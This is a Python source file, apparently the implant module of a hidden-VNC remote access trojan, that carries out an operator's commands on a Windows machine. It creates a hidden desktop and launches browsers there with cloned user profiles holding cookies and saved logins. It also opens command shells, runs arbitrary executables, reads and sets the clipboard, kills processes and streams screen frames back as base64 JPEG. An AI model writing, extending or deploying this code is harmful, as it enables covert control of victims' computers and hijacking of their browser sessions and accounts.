"""HVNC Actions Module.

Handles all HVNC-related actions from the operator:
- Starting/stopping hidden desktop
- Launching applications with profile cloning
- Clipboard operations
- Process management
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import shutil
import subprocess
import threading
from typing import Any, Callable

logger = logging.getLogger(__name__)

# Only available on Windows
if platform.system() == "Windows":
    from ctypes import wintypes
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    # Clipboard formats
    CF_TEXT = 1
    CF_UNICODETEXT = 13
    
    # OpenClipboard
    user32.OpenClipboard.argtypes = [wintypes.HWND]
    user32.OpenClipboard.restype = wintypes.BOOL
    user32.CloseClipboard.argtypes = []
    user32.CloseClipboard.restype = wintypes.BOOL
    user32.EmptyClipboard.argtypes = []
    user32.EmptyClipboard.restype = wintypes.BOOL
    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = wintypes.HANDLE
    user32.SetClipboardData.argtypes = [wintypes.UINT, wintypes.HANDLE]
    user32.SetClipboardData.restype = wintypes.HANDLE
    
    kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalLock.restype = wintypes.LPVOID
    kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalUnlock.restype = wintypes.BOOL
    kernel32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
    kernel32.GlobalAlloc.restype = wintypes.HGLOBAL
    kernel32.GlobalSize.argtypes = [wintypes.HGLOBAL]
    kernel32.GlobalSize.restype = ctypes.c_size_t
    
    GMEM_MOVEABLE = 0x0002

# Browser profile paths
BROWSER_PROFILES = {
    "chrome": {
        "paths": [
            os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        ],
        "exe": [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        ],
        "args": ["--user-data-dir={profile_dir}", "--no-first-run", "--no-default-browser-check"],
    },
    "firefox": {
        "paths": [
            os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
        ],
        "exe": [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe",
        ],
        "args": ["-profile", "{profile_dir}", "-no-remote"],
    },
    "edge": {
        "paths": [
            os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
        ],
        "exe": [
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        ],
        "args": ["--user-data-dir={profile_dir}", "--no-first-run", "--no-default-browser-check"],
    },
    "opera": {
        "paths": [
            os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        ],
        "exe": [
            r"C:\Program Files\Opera\opera.exe",
            r"C:\Program Files (x86)\Opera\opera.exe",
            os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera\opera.exe"),
        ],
        "args": ["--user-data-dir={profile_dir}", "--no-first-run"],
    },
    "brave": {
        "paths": [
            os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
        ],
        "exe": [
            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        ],
        "args": ["--user-data-dir={profile_dir}", "--no-first-run", "--no-default-browser-check"],
    },
}


class HVNCActions:
    """Handles HVNC actions from the operator."""
    
    def __init__(self, hvnc_session=None):
        """Initialize HVNC actions handler.
        
        Args:
            hvnc_session: The HVNCSession instance (from hvnc.py or hvnc_track.py)
        """
        self._session = hvnc_session
        self._active = False
        self._desktop_name = None
        self._processes: list[subprocess.Popen] = []
        self._temp_profiles: list[str] = []
        self._lock = threading.Lock()
    
    def set_session(self, session) -> None:
        """Set or update the HVNC session."""
        self._session = session
        if session:
            self._active = True
            self._desktop_name = getattr(session, '_desktop', None)
            if self._desktop_name and hasattr(self._desktop_name, 'name'):
                self._desktop_name = self._desktop_name.name
    
    @property
    def is_active(self) -> bool:
        return self._active and self._session is not None
    
    def start(self) -> dict:
        """Start HVNC session - create hidden desktop."""
        if self._active:
            return {
                "action": "hvnc_start",
                "success": True,
                "desktop_name": self._desktop_name,
                "message": "HVNC already active"
            }
        
        try:
            from .hvnc import HVNCSession
            self._session = HVNCSession(
                width=1920,
                height=1080,
                fps=30,
            )
            self._session.start_shell()
            self._active = True
            self._desktop_name = self._session.desktop.name
            
            logger.info("HVNC started: %s", self._desktop_name)
            return {
                "action": "hvnc_start",
                "success": True,
                "desktop_name": self._desktop_name
            }
        except Exception as exc:
            logger.error("Failed to start HVNC: %s", exc)
            return {
                "action": "hvnc_start",
                "success": False,
                "error": str(exc)
            }
    
    def stop(self) -> dict:
        """Stop HVNC session - close hidden desktop."""
        if not self._active:
            return {
                "action": "hvnc_stop",
                "success": True,
                "message": "HVNC not active"
            }
        
        try:
            # Kill all tracked processes
            for proc in self._processes:
                try:
                    proc.terminate()
                except Exception:
                    pass
            self._processes.clear()
            
            # Clean up temp profiles
            for path in self._temp_profiles:
                try:
                    shutil.rmtree(path, ignore_errors=True)
                except Exception:
                    pass
            self._temp_profiles.clear()
            
            # Close session
            if self._session:
                self._session.close()
                self._session = None
            
            self._active = False
            self._desktop_name = None
            
            logger.info("HVNC stopped")
            return {
                "action": "hvnc_stop",
                "success": True
            }
        except Exception as exc:
            logger.error("Failed to stop HVNC: %s", exc)
            return {
                "action": "hvnc_stop",
                "success": False,
                "error": str(exc)
            }
    
    def get_status(self) -> dict:
        """Get HVNC status."""
        return {
            "action": "hvnc_status",
            "active": self._active,
            "desktop_name": self._desktop_name,
            "process_count": len(self._processes)
        }
    
    def launch_browser(self, browser: str, clone_profile: bool = True) -> dict:
        """Launch browser on hidden desktop with optional profile cloning.
        
        Args:
            browser: Browser name (chrome, firefox, edge, opera, brave)
            clone_profile: Whether to clone the user's browser profile
        """
        if not self.is_active:
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": "HVNC not active"
            }
        
        browser_lower = browser.lower()
        if browser_lower not in BROWSER_PROFILES:
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": f"Unknown browser: {browser}"
            }
        
        config = BROWSER_PROFILES[browser_lower]
        
        # Find executable
        exe_path = None
        for path in config["exe"]:
            if os.path.exists(path):
                exe_path = path
                break
        
        if not exe_path:
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": f"{browser} not installed"
            }
        
        try:
            profile_dir = None
            if clone_profile:
                # Find original profile
                original_profile = None
                for path in config["paths"]:
                    if os.path.exists(path):
                        original_profile = path
                        break
                
                if original_profile:
                    # Create temp copy of profile
                    import tempfile
                    temp_dir = tempfile.mkdtemp(prefix=f"hvnc_{browser_lower}_")
                    profile_dir = temp_dir
                    
                    # Copy profile (this can be slow for large profiles)
                    logger.info("Cloning %s profile to %s", browser, temp_dir)
                    
                    # For Chrome-based browsers, copy specific folders
                    if browser_lower in ("chrome", "edge", "brave", "opera"):
                        src_default = os.path.join(original_profile, "Default")
                        if os.path.exists(src_default):
                            dst_default = os.path.join(temp_dir, "Default")
                            shutil.copytree(src_default, dst_default, 
                                          ignore=shutil.ignore_patterns(
                                              "Cache", "Code Cache", "GPUCache",
                                              "*.log", "*.tmp"
                                          ))
                        # Copy Local State
                        local_state = os.path.join(original_profile, "Local State")
                        if os.path.exists(local_state):
                            shutil.copy2(local_state, temp_dir)
                    else:
                        # Firefox - copy entire profile
                        for item in os.listdir(original_profile):
                            src = os.path.join(original_profile, item)
                            dst = os.path.join(temp_dir, item)
                            if os.path.isdir(src):
                                shutil.copytree(src, dst,
                                              ignore=shutil.ignore_patterns("cache2", "*.log"))
                            else:
                                shutil.copy2(src, dst)
                    
                    self._temp_profiles.append(temp_dir)
                    logger.info("Profile cloned to %s", temp_dir)
            
            # Build command
            args = []
            for arg in config["args"]:
                if profile_dir:
                    args.append(arg.format(profile_dir=profile_dir))
                elif "{profile_dir}" not in arg:
                    args.append(arg)
            
            # Launch on hidden desktop
            proc = self._session.launch_application(exe_path, args=args)
            
            if proc:
                self._processes.append(proc)
                return {
                    "action": "hvnc_launch_browser",
                    "success": True,
                    "app": browser,
                    "pid": proc.pid,
                    "cloned": clone_profile and profile_dir is not None
                }
            else:
                return {
                    "action": "hvnc_launch_browser",
                    "success": False,
                    "error": "Failed to launch process"
                }
                
        except Exception as exc:
            logger.error("Failed to launch browser %s: %s", browser, exc)
            return {
                "action": "hvnc_launch_browser",
                "success": False,
                "error": str(exc)
            }
    
    def launch_cmd(self) -> dict:
        """Launch Command Prompt on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_launch_cmd", "success": False, "error": "HVNC not active"}
        
        try:
            proc = self._session.launch_application("cmd.exe")
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_launch_cmd", "success": True, "pid": proc.pid}
            return {"action": "hvnc_launch_cmd", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_launch_cmd", "success": False, "error": str(exc)}
    
    def launch_powershell(self) -> dict:
        """Launch PowerShell on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_launch_powershell", "success": False, "error": "HVNC not active"}
        
        try:
            # Try pwsh (PowerShell Core) first, then powershell.exe
            exe = "pwsh.exe" if shutil.which("pwsh") else "powershell.exe"
            proc = self._session.launch_application(exe)
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_launch_powershell", "success": True, "pid": proc.pid}
            return {"action": "hvnc_launch_powershell", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_launch_powershell", "success": False, "error": str(exc)}
    
    def launch_explorer(self) -> dict:
        """Launch File Explorer on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_launch_explorer", "success": False, "error": "HVNC not active"}
        
        try:
            proc = self._session.launch_application("explorer.exe")
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_launch_explorer", "success": True, "pid": proc.pid}
            return {"action": "hvnc_launch_explorer", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_launch_explorer", "success": False, "error": str(exc)}
    
    def run_exe(self, path: str, args: str = "") -> dict:
        """Run custom executable on hidden desktop."""
        if not self.is_active:
            return {"action": "hvnc_run_exe", "success": False, "error": "HVNC not active"}
        
        if not path:
            return {"action": "hvnc_run_exe", "success": False, "error": "Path required"}
        
        try:
            arg_list = args.split() if args else None
            proc = self._session.launch_application(path, args=arg_list)
            if proc:
                self._processes.append(proc)
                return {"action": "hvnc_run_exe", "success": True, "path": path, "pid": proc.pid}
            return {"action": "hvnc_run_exe", "success": False, "error": "Failed to launch"}
        except Exception as exc:
            return {"action": "hvnc_run_exe", "success": False, "error": str(exc)}
    
    def start_process(self, path: str, args: str = "") -> dict:
        """Start a process on hidden desktop."""
        return self.run_exe(path, args)
    
    def get_clipboard(self) -> dict:
        """Get clipboard text from hidden desktop."""
        if platform.system() != "Windows":
            return {"action": "hvnc_get_clipboard", "success": False, "error": "Windows only"}
        
        try:
            text = ""
            if user32.OpenClipboard(None):
                try:
                    handle = user32.GetClipboardData(CF_UNICODETEXT)
                    if handle:
                        data = kernel32.GlobalLock(handle)
                        if data:
                            text = ctypes.wstring_at(data)
                            kernel32.GlobalUnlock(handle)
                finally:
                    user32.CloseClipboard()
            
            return {
                "action": "hvnc_get_clipboard",
                "success": True,
                "text": text
            }
        except Exception as exc:
            return {"action": "hvnc_get_clipboard", "success": False, "error": str(exc)}
    
    def send_clipboard(self, text: str) -> dict:
        """Send text to clipboard on hidden desktop."""
        if platform.system() != "Windows":
            return {"action": "hvnc_send_clipboard", "success": False, "error": "Windows only"}
        
        if not text:
            return {"action": "hvnc_send_clipboard", "success": False, "error": "Text required"}
        
        try:
            # Encode text to UTF-16
            data = text.encode("utf-16-le") + b"\x00\x00"
            
            if user32.OpenClipboard(None):
                try:
                    user32.EmptyClipboard()
                    
                    # Allocate global memory
                    h_mem = kernel32.GlobalAlloc(GMEM_MOVEABLE, len(data))
                    if h_mem:
                        locked = kernel32.GlobalLock(h_mem)
                        if locked:
                            ctypes.memmove(locked, data, len(data))
                            kernel32.GlobalUnlock(h_mem)
                            user32.SetClipboardData(CF_UNICODETEXT, h_mem)
                finally:
                    user32.CloseClipboard()
            
            return {"action": "hvnc_send_clipboard", "success": True}
        except Exception as exc:
            return {"action": "hvnc_send_clipboard", "success": False, "error": str(exc)}
    
    def kill_process(self, pid: int = None, name: str = None) -> dict:
        """Kill a process on hidden desktop."""
        if not pid and not name:
            return {"action": "hvnc_kill_process", "success": False, "error": "PID or name required"}
        
        try:
            if pid:
                # Kill by PID
                os.kill(pid, 9)
                # Remove from tracked processes
                self._processes = [p for p in self._processes if p.pid != pid]
                return {"action": "hvnc_kill_process", "success": True, "pid": pid}
            else:
                # Kill by name
                killed = 0
                for proc in list(self._processes):
                    try:
                        if name.lower() in proc.args[0].lower():
                            proc.terminate()
                            self._processes.remove(proc)
                            killed += 1
                    except Exception:
                        pass
                
                # Also try taskkill
                try:
                    subprocess.run(["taskkill", "/F", "/IM", name], 
                                 capture_output=True, timeout=5)
                except Exception:
                    pass
                
                return {"action": "hvnc_kill_process", "success": True, "name": name, "killed": killed}
                
        except Exception as exc:
            return {"action": "hvnc_kill_process", "success": False, "error": str(exc)}
    
    def list_processes(self) -> dict:
        """List processes running on hidden desktop."""
        processes = []
        for proc in self._processes:
            try:
                if proc.poll() is None:  # Still running
                    name = os.path.basename(proc.args[0]) if proc.args else "unknown"
                    processes.append({"pid": proc.pid, "name": name})
            except Exception:
                pass
        
        return {
            "action": "hvnc_list_processes",
            "success": True,
            "processes": processes
        }
    
    def get_frame(self, quality: int = 50, scale: float = 0.5) -> dict:
        """Get a frame from the hidden desktop as base64 JPEG.
        
        Args:
            quality: JPEG quality (1-100)
            scale: Scale factor for the image (0.1-1.0)
            
        Returns:
            Response dict with base64 encoded JPEG frame
        """
        if not self.is_active:
            return {"action": "hvnc_get_frame", "success": False, "error": "HVNC not active"}
        
        try:
            import base64
            import io
            
            # Get raw frame from session
            frame_data, size = self._session.get_frame(timeout=0.5)
            
            if not frame_data or not size:
                return {"action": "hvnc_get_frame", "success": False, "error": "No frame available"}
            
            width, height = size
            
            # Convert BGRA to RGB and create image
            try:
                from PIL import Image
                
                # Frame data is BGRA
                img = Image.frombytes("RGBA", (width, height), frame_data, "raw", "BGRA")
                img = img.convert("RGB")
                
                # Scale if needed
                if scale < 1.0:
                    new_width = int(width * scale)
                    new_height = int(height * scale)
                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                
                # Save as JPEG to buffer
                buffer = io.BytesIO()
                img.save(buffer, format="JPEG", quality=quality)
                jpeg_data = buffer.getvalue()
                
                # Encode to base64
                b64_frame = base64.b64encode(jpeg_data).decode("ascii")
                
                return {
                    "action": "hvnc_get_frame",
                    "success": True,
                    "frame": b64_frame,
                    "width": img.width,
                    "height": img.height,
                }
            except ImportError:
                # PIL not available, return error
                return {"action": "hvnc_get_frame", "success": False, "error": "PIL not installed"}
                
        except Exception as exc:
            logger.error("Failed to get HVNC frame: %s", exc)
            return {"action": "hvnc_get_frame", "success": False, "error": str(exc)}
    
    def handle_action(self, action: str, payload: dict) -> dict:
        """Handle HVNC action from operator.
        
        Args:
            action: Action name (without hvnc_ prefix)
            payload: Action payload
            
        Returns:
            Response dict to send back to operator
        """
        handlers = {
            "start": lambda: self.start(),
            "stop": lambda: self.stop(),
            "status": lambda: self.get_status(),
            "launch_browser": lambda: self.launch_browser(
                payload.get("browser", "chrome"),
                payload.get("clone_profile", True)
            ),
            "launch_cmd": lambda: self.launch_cmd(),
            "launch_powershell": lambda: self.launch_powershell(),
            "launch_explorer": lambda: self.launch_explorer(),
            "run_exe": lambda: self.run_exe(
                payload.get("path", ""),
                payload.get("args", "")
            ),
            "start_process": lambda: self.start_process(
                payload.get("path", ""),
                payload.get("args", "")
            ),
            "get_clipboard": lambda: self.get_clipboard(),
            "send_clipboard": lambda: self.send_clipboard(payload.get("text", "")),
            "kill_process": lambda: self.kill_process(
                payload.get("pid"),
                payload.get("name")
            ),
            "list_processes": lambda: self.list_processes(),
            "get_frame": lambda: self.get_frame(
                payload.get("quality", 50),
                payload.get("scale", 0.5)
            ),
        }
        
        handler = handlers.get(action)
        if handler:
            return handler()
        
        return {
            "action": f"hvnc_{action}",
            "success": False,
            "error": f"Unknown action: {action}"
        }


# Global instance
_hvnc_actions: HVNCActions | None = None


def get_hvnc_actions() -> HVNCActions:
    """Get or create global HVNC actions instance."""
    global _hvnc_actions
    if _hvnc_actions is None:
        _hvnc_actions = HVNCActions()
    return _hvnc_actions


def handle_hvnc_action(action: str, payload: dict) -> dict:
    """Handle HVNC action - convenience function."""
    return get_hvnc_actions().handle_action(action, payload)
